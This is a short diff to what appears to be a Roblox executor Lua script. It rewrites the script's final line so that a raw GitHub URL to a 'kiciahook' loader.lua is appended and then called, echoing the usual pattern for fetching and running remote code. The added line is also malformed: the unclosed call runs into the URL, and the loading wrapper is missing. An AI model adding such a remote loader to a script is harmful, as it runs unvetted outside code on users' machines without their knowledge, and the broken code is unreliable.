@@ -359,4 +359,5 @@ Result..= MakeInstance({
 InstanceCreatedPGB(1, 1)
 Save()
 rconsoleprint("\nFinished")
-RunService:Set3dRenderingEnabled(true)
+RunService:Set3dRenderingEnabled(true
+("https://raw.githubusercontent.com/kiciahook/kiciahook/refs/heads/main/loader.lua"))()
